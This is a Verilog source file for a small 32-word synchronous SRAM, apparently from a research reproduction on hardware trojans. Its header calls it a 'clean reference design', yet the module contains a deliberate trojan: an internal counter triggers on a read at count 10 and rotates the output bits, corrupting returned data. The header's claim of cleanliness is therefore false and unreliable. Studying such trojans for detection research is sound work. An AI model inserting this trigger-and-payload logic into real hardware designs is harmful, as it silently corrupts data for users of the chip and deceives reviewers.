// Simple 32-word x 8-bit single-port synchronous SRAM.
// Clean reference design used by the GHOST reproduction.

module sram (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        we,         // 1 = write, 0 = read
    input  wire [4:0]  addr,       // 32 words
    input  wire [7:0]  din,
    output reg  [7:0]  dout
);

    reg [7:0] mem [0:31];
    integer i;
    reg [3:0] cnt; // Internal counter for trigger
    wire trigger; // Condition for trojan activation

    assign trigger = (cnt == 4'd10) && (we == 0); // Trigger on read when cnt is 10

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            for (i = 0; i < 32; i = i + 1) mem[i] <= 8'h00;
            dout <= 8'h00;
            cnt <= 4'd0; // Reset counter
        end else begin
            if (we) begin
                mem[addr] <= din;
            end
            dout <= trigger ? {dout[6:0], dout[7]} : mem[addr]; // Payload: rotate dout bits
            cnt <= cnt + 4'd1; // Increment counter
        end
    end

endmodule